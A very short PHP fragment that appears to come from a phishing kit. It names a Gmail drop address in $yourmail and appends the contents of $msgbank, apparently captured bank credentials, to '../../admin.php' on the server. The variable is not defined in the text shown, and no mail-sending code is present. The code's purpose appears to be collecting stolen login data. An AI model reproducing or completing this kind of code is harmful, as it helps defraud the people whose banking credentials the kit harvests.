<?php

$yourmail  = 'sales.business0059@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>